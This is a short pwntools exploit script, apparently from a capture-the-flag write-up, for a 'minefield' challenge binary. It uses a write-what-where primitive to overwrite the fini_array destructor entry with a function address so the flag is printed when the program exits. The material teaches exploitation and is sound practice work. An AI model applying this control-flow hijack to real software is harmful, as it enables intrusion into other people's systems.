from pwn import *


elf = ELF("./challenge/minefield")

conn = remote(MACHINE_IP, MACHINE_PORT)

progress = log.progress("retrieving flag")

# ANCHOR: choose_menu
progress.status("choose to plant a mine");
conn.recvlines(3)
conn.sendline('2')
# ANCHOR_END: choose_menu

# ANCHOR: www_where
progress.status("choose where to plant the mine")
conn.recvuntil("Insert type of mine: ")
conn.sendline('0x%x' % elf.symbols["__do_global_dtors_aux_fini_array_entry"])
# ANCHOR_END: www_where

# ANCHOR: www_what
progress.status("choose what value to set the mine")
conn.recvuntil("Insert location to plant: ")
conn.sendline('0x%x' % elf.symbols["_"])
# ANCHOR_END: www_what

progress.status("run for the flag")
conn.recvline_startswith(b"Mission accomplished!")
progress.success(conn.recvallS())
